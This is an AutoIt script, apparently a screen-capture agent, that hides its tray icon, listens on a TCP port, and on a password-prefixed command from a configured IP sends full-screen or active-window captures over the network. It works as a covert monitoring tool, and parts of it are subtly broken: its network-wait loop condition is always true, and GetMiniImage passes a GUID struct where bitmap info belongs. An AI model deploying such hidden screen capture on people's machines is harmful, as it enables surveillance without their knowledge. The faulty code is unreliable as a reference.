#NoTrayIcon
#include <gdiplus.au3>
#include <GDIPlusConstants.au3>
#include <screencapture.au3>

Opt("TrayIconHide", 1)
Opt("GUIOnEventMode", 1)
$AYAR = @ScriptDir & "\Jset.cnk"
$Serverip = IniRead($AYAR, "AYAR", "serverip", "192.168.0.4")
$iletisimpass = IniRead($AYAR, "AYAR", "sifre", "A3")

While 1
    If (@IPAddress1 <> "0.0.0.0") OR (@IPAddress1 <> "127.0.0.1") OR (@IPAddress2 <> "0.0.0.0") OR (@IPAddress3 <> "0.0.0.0") OR (@IPAddress4 <> "0.0.0.0") Then ExitLoop
    Sleep(50)
WEnd

$IPadresim = IniRead($AYAR, "AYAR", "ipadres", IPadresim())
Global $Mht = 75, $Mwt = 100
Local $X = 0
Local $Y = 0
Local $iPort = 5484
$BS_FLAT = 0
Global $MainSocket, $ConnectedSocket, $iCount
Local $temp

TCPStartup()
Global $iMainSocket, $iAccSocket = -1, $sBuff, $sRecv = "", $i = 0, $iFirstWhile = True

$iMainSocket = TCPListen($IPadresim, $iPort, 2)

While 1
    $iAccSocket = -1
    While $iAccSocket = -1
        $iAccSocket = TCPAccept($iMainSocket)
        Sleep(10)
    WEnd
    Local $Width = @DesktopWidth
    Local $Height = @DesktopHeight
    Bekle()
    $bBytes = 0
    TCPCloseSocket($iAccSocket)
WEnd



Func Bekle()
    $sRecv = ""
    While ($sRecv <> $iletisimpass & "|gonder") AND ($sRecv <> $iletisimpass & "|gonderpncr") AND ($sRecv <> $iletisimpass & "|gondermini") AND ($sRecv <> $iletisimpass & "|gonderjpg") AND ($sRecv <> $iletisimpass & "|gondertest") AND ($sRecv <> $iletisimpass & "|gonderbmp")
        $sRecv = TCPRecv($iAccSocket, 256)
        If @error Then Return
        If (SocketToIP($iAccSocket) <> $Serverip) Then Return
    WEnd
    Sleep(10)
    $bBytes = DllStructCreate("byte[" & BitAND(($Width + 3), 0xFFFFFFFC) * $Height * 3 & "]")
    If $sRecv = $iletisimpass & "|gonder" Then
        GetImage($X, $Y, $Width, $Height, $bBytes)
        $retval = SendImage($bBytes, $Width, $Height)
    ElseIf $sRecv = $iletisimpass & "|gonderpncr" Then
        GetImage($X, $Y, $Width, $Height, $bBytes, WinGetHandle(WinGetTitle("[active]")))
        $retval = SendImage($bBytes, $Width, $Height)
    ElseIf $sRecv = $iletisimpass & "|gondermini" Then
        _GDIPlus_Startup()
        Global $CLSID = _GDIPlus_EncodersGetCLSID("JPEG")
        GetMiniImage($X, $Y, $Width, $Height, $bBytes, WinGetHandle(WinGetTitle("[active]")))
        ;$retval = SendImage($bBytes, $Mwt, $Mht)
        $retval = SendImage($bBytes, $Width, $Height)
        _GDIPlus_Shutdown()
    ElseIf $sRecv = $iletisimpass & "|gonderbmp" Then
        $retval = SendBmp($Width, $Height)
    ElseIf $sRecv = $iletisimpass & "|gondertest" Then
        GetImage($X, $Y, 100, 100, $bBytes)
        $retval = SendImage($bBytes, 100, 100)
    EndIf
EndFunc   ;==>Bekle


Func SendBmp($Width, $Height)
    Local $iWritten
    Local $buffer
    TCPSend($iAccSocket, "size|" & $Width & "|" & $Height & "|")
    If @error Then Return
    Sleep(10)


    Const $DIB_RGB_COLORS = 0
    $iWidth = $Width
    $iHeight = $Height
    $iBitCount = 24
    $hBmp = _ScreenCapture_Capture("", 0, 0, $iWidth, $iHeight)

    $tBMI = DllStructCreate($tagBITMAPINFO)
    DllStructSetData($tBMI, "Size", DllStructGetSize($tBMI) - 4)
    DllStructSetData($tBMI, "Width", $iWidth)
    DllStructSetData($tBMI, "Height", $iHeight)
    DllStructSetData($tBMI, "Planes", 1)
    DllStructSetData($tBMI, "BitCount", $iBitCount)
    $hDC = _WinAPI_GetDC(0)

    $hCDC = _WinAPI_CreateCompatibleDC($hDC)
    $aDIB = DllCall('gdi32.dll', 'ptr', 'CreateDIBSection', 'ptr', 0, 'ptr', DllStructGetPtr($tBMI), 'uint', $DIB_RGB_COLORS, 'ptr*', 0, 'ptr', 0, 'uint', 0)
    _WinAPI_SelectObject($hCDC, $aDIB[0])
    _WinAPI_GetDIBits($hDC, $hBmp, 0, $iHeight, $aDIB[4], DllStructGetPtr($tBMI), $DIB_RGB_COLORS)

    ; create the a dllstruct with the pointer $aDIB[4]
    $tBits = DllStructCreate('byte[' & $iWidth * $iHeight * $iBitCount / 8 & ']', $aDIB[4])

    $buffer = DllStructGetData($tBits, 1)

    _WinAPI_DeleteObject($aDIB[0])
    _WinAPI_DeleteDC($hCDC)
    _WinAPI_ReleaseDC(0, $hDC)

    While BinaryLen($buffer)
        $iWritten = TCPSend($iAccSocket, $buffer)
        If @error Then ExitLoop
        $buffer = BinaryMid($buffer, $iWritten + 1, BinaryLen($buffer) - $iWritten)
    WEnd
    $buffer = 0
    Return 1
EndFunc   ;==>SendBmp

Func SendImage(ByRef $bBytes, $Width, $Height)
    Local $ERR
    Local $iWritten
    Local $buffer
    $buffer = DllStructGetData($bBytes, 1)
    ;$buffer = StringReplace($buffer,"FEFEFE","FFFEFE")
    ;Local $size = StringFormat("%s|%s|", $width, $height)
    TCPSend($iAccSocket, "size|" & $Width & "|" & $Height & "|")
    If @error Then Return
    Sleep(10)
    While BinaryLen($buffer)
        $iWritten = TCPSend($iAccSocket, $buffer)
        If @error Then ExitLoop
        ;Sleep(10)
        $buffer = BinaryMid($buffer, $iWritten + 1, BinaryLen($buffer) - $iWritten)
    WEnd
    ;$iCount += 1
    ;TCPCloseSocket($iAccSocket)
    ;StatusWrite ($Status1, "Sent :" & $iWritten & "  Count :" & $iCount)
    $buffer = 0
    Return 1
EndFunc   ;==>SendImage

Func GetImage($get_x, $get_y, $wid, $ht, ByRef $byteStruct, $hwnd = 0)
    Local Const $DIB_RGB_COLORS = 0
    Local Const $SRCCOPY = 0xCC0020
    Local Const $SRCINVERT = 0x00660046

    Local $BitInfo = DllStructCreate("dword;int;int;ushort;ushort;dword;dword;int;int;dword;dword;byte[4]")
    DllStructSetData($BitInfo, 1, 40)
    DllStructSetData($BitInfo, 2, $wid)
    DllStructSetData($BitInfo, 3, $ht)
    DllStructSetData($BitInfo, 4, 1)
    DllStructSetData($BitInfo, 5, 24)
    Local $dc = DllCall("user32.dll", "int", "GetWindowDC", "hwnd", $hwnd)
    $dc = $dc[0]
    Local $iDC = DllCall("gdi32.dll", "int", "CreateCompatibleDC", "int", $dc)
    $iDC = $iDC[0]
    Local $iBitmap = DllCall("gdi32.dll", "hwnd", "CreateDIBSection", "int", $iDC, "ptr", DllStructGetPtr($BitInfo), _
            "int", $DIB_RGB_COLORS, "ptr", 0, "hwnd", 0, "int", 0)
    $iBitmap = $iBitmap[0]
    DllCall("gdi32.dll", "hwnd", "SelectObject", "int", $iDC, "hwnd", $iBitmap)
    DllCall("gdi32.dll", "int", "BitBlt", "int", $iDC, "int", 0, "int", 0, "int", $wid, "int", _
            $ht, "int", $dc, "int", $get_x, "int", $get_y, "int", $SRCCOPY)
    DllCall("gdi32.dll", "int", "GetDIBits", "int", $iDC, "hwnd", $iBitmap, "int", 0, "int", $ht, "ptr", _
            DllStructGetPtr($byteStruct), "ptr", DllStructGetPtr($BitInfo), "int", $DIB_RGB_COLORS)
    $BitInfo = 0
    DllCall("user32.dll", "int", "ReleaseDC", "int", $dc, "hwnd", $hwnd)
    DllCall("gdi32.dll", "int", "DeleteDC", "int", $iDC)
    DllCall("gdi32.dll", "int", "DeleteObject", "hwnd", $iBitmap)
EndFunc   ;==>GetImage

Func GetMiniImage($get_x, $get_y, $wid, $ht, ByRef $byteStruct, $hwnd = 0)
    Local $tGUID = _WinAPI_GUIDFromString($CLSID)
    Local $pGUID = DllStructGetPtr($tGUID)

    Local Const $DIB_RGB_COLORS = 0
    Local Const $SRCCOPY = 0xCC0020
    Local $BitInfo = DllStructCreate("dword;int;int;ushort;ushort;dword;dword;int;int;dword;dword;byte[4]")
    DllStructSetData($BitInfo, 1, 40)
    DllStructSetData($BitInfo, 2, $wid)
    DllStructSetData($BitInfo, 3, $ht)
    DllStructSetData($BitInfo, 4, 1)
    DllStructSetData($BitInfo, 5, 24)
    Local $dc = DllCall("user32.dll", "int", "GetWindowDC", "hwnd", $hwnd)
    $dc = $dc[0]
    Local $iDC = DllCall("gdi32.dll", "int", "CreateCompatibleDC", "int", $dc)
    $iDC = $iDC[0]
    Local $iBitmap = DllCall("gdi32.dll", "hwnd", "CreateDIBSection", "int", $iDC, "ptr", DllStructGetPtr($tGUID), _
            "int", $DIB_RGB_COLORS, "ptr", 0, "hwnd", 0, "int", 0)
    $iBitmap = $iBitmap[0]
    DllCall("gdi32.dll", "hwnd", "SelectObject", "int", $iDC, "hwnd", $iBitmap)
    DllCall("gdi32.dll", "int", "BitBlt", "int", $iDC, "int", 0, "int", 0, "int", $wid, "int", _
            $ht, "int", $dc, "int", $get_x, "int", $get_y, "int", $SRCCOPY)
    DllCall("gdi32.dll", "int", "GetDIBits", "int", $iDC, "hwnd", $iBitmap, "int", 0, "int", $ht, "ptr", _
            DllStructGetPtr($tGUID), "ptr", DllStructGetPtr($BitInfo), "int", $DIB_RGB_COLORS)
    $BitInfo = 0
    DllCall("user32.dll", "int", "ReleaseDC", "int", $dc, "hwnd", $hwnd)
    DllCall("gdi32.dll", "int", "DeleteDC", "int", $iDC)
    DllCall("gdi32.dll", "int", "DeleteObject", "hwnd", $iBitmap)
EndFunc   ;==>GetMiniImage

Func SocketToIP($SHOCKET)
    Local $sockaddr, $aRet

    $sockaddr = DllStructCreate("short;ushort;uint;char[8]")

    $aRet = DllCall("Ws2_32.dll", "int", "getpeername", "int", $SHOCKET, _
            "ptr", DllStructGetPtr($sockaddr), "int*", DllStructGetSize($sockaddr))
    If Not @error And $aRet[0] = 0 Then
        $aRet = DllCall("Ws2_32.dll", "str", "inet_ntoa", "int", DllStructGetData($sockaddr, 3))
        If Not @error Then $aRet = $aRet[0]
    Else
        $aRet = 0
    EndIf

    $sockaddr = 0

    Return $aRet
EndFunc   ;==>SocketToIP


Func IPadresim()
    Local $wbemFlagReturnImmediately = 0x10
    Local $wbemFlagForwardOnly = 0x20
    Local $colItems = ""
    Local $strComputer = "localhost"

    Local $Output = ""
    $Output = $Output & "Computer: " & $strComputer & @CRLF
    Local $objWMIService = ObjGet("winmgmts:\\" & $strComputer & "\root\CIMV2")
    Local $colItems = $objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration", "WQL", _
            $wbemFlagReturnImmediately + $wbemFlagForwardOnly)

    If IsObj($colItems) Then
        For $objItem In $colItems
            if ($objItem.IPAddress(0) <> "") AND (StringLen($objItem.DefaultIPGateway(0)) > 3) Then
                If @IPAddress1 = $objItem.IPAddress(0) Then Return @IPAddress1
                If @IPAddress2 = $objItem.IPAddress(0) Then Return @IPAddress2
                If @IPAddress3 = $objItem.IPAddress(0) Then Return @IPAddress3
                If @IPAddress4 = $objItem.IPAddress(0) Then Return @IPAddress4
            EndIf
        Next
    Else
        Return @IPAddress1
    EndIf
EndFunc   ;==>IPadresim